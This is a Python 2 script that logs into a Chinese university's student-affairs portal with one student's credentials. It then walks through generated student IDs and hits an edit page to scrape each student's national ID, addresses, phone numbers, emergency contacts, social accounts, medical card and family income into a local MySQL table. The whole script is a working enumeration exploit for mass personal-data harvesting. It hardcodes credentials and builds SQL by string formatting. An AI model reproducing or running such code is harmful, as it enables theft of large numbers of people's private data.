#encoding:utf-8
import requests
import urllib
import datetime
import time
from bs4 import BeautifulSoup
import MySQLdb

def getCookie():
    loginUrl = "http://210.42.35.33/xg/home/login.do"
    result =  requests.get(loginUrl)
    return result.cookies['JSESSIONID']


def createHeaders(cookie):
    headers = {
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Cookie':'JSESSIONID='+cookie,
        'Accept-Encoding':'gzip, deflate, sdch',
        'Origin':'http://210.42.38.26:84',
        'Accept-Language':'zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4',
        'Connection':'keep-alive',
        'Host':'210.42.35.33',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Upgrade-Insecure-Requests':1,
        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
        'Referer': 'http://210.42.35.33/xg/home/login.do'
    }
    return headers

def login(username,headers):
    thistime = time.mktime(datetime.datetime.now().timetuple())

    try:
        infoUrl = 'http://210.42.35.33/xg/student/toTableInfo.do?_tsp_='+str(thistime-10)+'&typeid=info&studentId='+str(username)+'&method=edit'

        page = ctguRequest.get(infoUrl,headers=headers)
        soup = BeautifulSoup(page.text)

        divSum = soup.find_all('div','am-form-group am-g')

        if divSum != '':
            name = divSum[0].find_all('div')[1].input['value']
            birth = divSum[4].find_all('div')[1].input['value']
            minzu = divSum[5].find_all('div')[1].input['value']
            idNum = divSum[7].find_all('div')[1].input['value']
            xueyuan = divSum[9].find_all('div')[1].input['value']
            major = divSum[10].find_all('div')[1].input['value']
            kaoshenghao = divSum[15].find_all('div')[1].input['value']
            kaoshengleibie = divSum[16].find_all('div')[1].input['value']
            shengao = divSum[26].find_all('div')[1].input['value']
            tizhong = divSum[27].find_all('div')[1].input['value']
            dizhi = divSum[28].find_all('div')[1].input['value']
            jiatingdianhua = divSum[31].find_all('div')[1].input['value']
            benrendianhua = divSum[34].find_all('div')[1].input['value']
            jinji = divSum[37].find_all('div')[1].input['value']
            jinjidianhua = divSum[38].find_all('div')[1].input['value']
            qq = divSum[39].find_all('div')[1].input['value']
            youjian = divSum[40].find_all('div')[1].input['value']
            wechat = divSum[41].find_all('div')[1].input['value']
            nhCard = divSum[49].find_all('div')[1].input['value']
            brothNum = divSum[58].find_all('div')[1].input['value']
            familyNum = divSum[59].find_all('div')[1].input['value']
            allYearEarn = divSum[60].find_all('div')[1].input['value']
            address = divSum[72].find_all('div')[1].input['value']
            hukouAttr = divSum[73].find_all('div')[1].input['value']
            string = "insert into info (username,name,birth,minzu,idNum,xueyuan,major,kaoshenghao,kaoshengleibie,shengao,tizhong,dizhi,jiatingdianhua,benrendianhua,jinji,jinjidianhua,qq,youjian,wechat,nhCard,brothNum,familyNum,allYearEarn,address,hukouAttr) VALUES ('%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s')"%(username,name,birth,minzu,idNum,xueyuan,major,kaoshenghao,kaoshengleibie,shengao,tizhong,dizhi,jiatingdianhua,benrendianhua,jinji,jinjidianhua,qq,youjian,wechat,nhCard,brothNum,familyNum,allYearEarn,address,hukouAttr)

            if name != '':
                print string
                try:
                    conn=MySQLdb.connect('localhost','root','thisispassword','allinfo')
                    if conn:
                        print 'yes'
                    else:
                        print 'no'
                    cur=conn.cursor()
                    cur.execute(string)
                    cur.close()
                    conn.commit()
                    conn.close()
                except MySQLdb.Error,e:
                    print "Mysql Error %d: %s" % (e.args[0], e.args[1])
    except:
        pass
def getLearnNum(headers):
    year = [2010,2011,2012,2013,2014,2015]
    allclass = [101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,121,123,124,126,128,129,130,131,132,134,135,
            136,137,138,139,140,141,142,146,147,149,150,151,155,152,153,154,196,133,101,115,108,150,127,800,120,145,143,148,197,125,934,309
            ]
    classNum = [1,2,3,4,5]

    for i in year:
        for j in allclass:
            for k in classNum:
                for l in range(01,100):
                    if l<10:
                        l = '0'+str(l)
                    username = str(i)+str(j)+str(k)+str(l)
                    login(username,headers)


if __name__ =='__main__':
    cookie = getCookie()
    headers = createHeaders(cookie)
    ctguRequest = requests.session()
    form = {
        'user_name':2014109115,
        'pass_word':109115
    }
    data = urllib.urlencode(form)
    loginUrl = "http://210.42.35.33/xg/home/login.do"
    result = ctguRequest.post(loginUrl,headers=headers,data=data)
    getLearnNum(headers)